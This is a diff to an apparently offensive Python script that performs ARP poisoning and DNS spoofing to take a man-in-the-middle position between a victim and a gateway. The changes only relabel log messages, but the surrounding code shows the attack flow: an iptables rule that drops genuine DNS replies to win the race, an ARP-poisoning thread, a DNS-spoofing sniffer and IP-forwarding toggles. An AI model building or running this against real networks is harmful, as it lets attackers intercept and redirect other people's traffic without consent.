@@ -171,7 +171,7 @@ def stop_sniffing(packet):
 def start_dns_spoofing():
     """Starts the continuous sniffing thread for DNS traffic."""
     
-    print(f"[*] Starting DNS sniffer on interface {INTERFACE}")
+    print(f"[DNS Spoof] Starting DNS sniffer on interface {INTERFACE}")
     
     # The filter ensures we only catch UDP traffic on port 53 (DNS)
     sniff_thread = threading.Thread(
@@ -202,8 +202,8 @@ def setup_and_run():
         print("[!] ERROR: Could not find MAC addresses for victim or gateway. Exiting.")
         sys.exit(1)
 
-    print(f"[*] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
-    print(f"[*] The victim at IP address {VICTIM_IP} is at MAC address {VICTIM_MAC}.")
+    print(f"[ARP Poison] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
+    print(f"[ARP Poison] The victim at IP address {VICTIM_IP} is at MAC address {VICTIM_MAC}.")
 
     # Enable IP Forwarding (Critical for MiTM)
     # The attacker machine needs to forward the packets between gateway and victim.
@@ -212,14 +212,14 @@ def setup_and_run():
 
     # Install the DNS Response Dropping Rule
     manage_iptables('A') # Add the DROP rule
-    print("[*] DNS response dropping rule installed to win the race.")
+    print("[DNS Spoof] DNS response dropping rule installed to win the race.")
 
     # Start ARP Poisoning thread
     arp_thread = threading.Thread(target=arp_poison_loop, 
         args=(VICTIM_IP, GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
     arp_thread.daemon = True
     arp_thread.start()
-    print("[*] ARP Poisoning started. MiTM position established.")
+    print("[ARP Poison] ARP Poisoning started. MiTM position established.")
     
     # Start DNS Spoofing thread
     dns_thread = start_dns_spoofing()
@@ -250,7 +250,7 @@ def cleanup():
     
     # REMOVE the DNS Response Dropping Rule
     manage_iptables('D') # Delete the DROP rule
-    print("[*] DNS response dropping rule removed.")
+    print("[DNS Spoof] DNS response dropping rule removed.")
     
     # Disable IP Forwarding
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
